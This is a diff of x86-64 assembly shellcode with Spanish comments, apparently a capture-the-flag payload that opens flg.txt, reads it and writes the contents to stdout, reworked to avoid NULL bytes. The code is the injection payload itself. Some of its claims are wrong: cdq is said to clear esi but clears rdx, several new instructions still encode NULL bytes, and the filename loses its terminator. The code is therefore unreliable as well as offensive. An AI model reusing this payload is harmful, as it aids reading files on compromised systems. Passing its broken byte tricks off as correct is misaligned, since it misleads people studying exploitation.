@@ -1,24 +1,29 @@
 section .text
 _start:
     ; push './flg.txt\x00'
-    push 0              ; push NULL string terminator
-    mov rdi, 0x7478742e676c662f  ; "/flg.txt" en reversa
-    push rdi            ; push to stack 
-    mov rdi, rsp        ; move pointer to filename
+    mov rax, 0x7478742e676c662f  ; "flg.txt" en reversa
+    push rax                     ; Push en la pila
+    mov rdi, rsp                 ; move pointer to filename
 
     ; open('rsp', 'O_RDONLY')
-    mov al, 2          ; open syscall number
-    xor esi, esi       ; set O_RDONLY flag
+    mov al, 2                    ; open syscall number
+    cdq                          ; limpia rdx (equivalente a xor esi, esi sin NULLs)
     syscall
 
     ; read file
-    mov rdi, rax       ; set fd to rax from open syscall
-    mov rsi, rsp       ; use stack as buffer
-    mov dl, 24         ; size to read
-    xor eax, eax       ; read syscall number
+    mov rsi, rsp                 ; buffer en la pila
+    mov rdx, 0x30                ; tamaño a leer
+    xchg eax, edi                ; fd en edi sin NULLs
+    xor eax, eax                 ; read syscall number
     syscall
 
     ; write output
-    mov al, 1          ; write syscall
-    mov dil, 1         ; set fd to stdout
+    mov edx, 0x30                ; tamaño a escribir
+    mov edi, 1                   ; fd = stdout
+    mov al, 1                    ; write syscall
+    syscall
+
+    ; exit
+    mov al, 60
+    cdq                          ; limpia rdx (evita NULL bytes)
     syscall
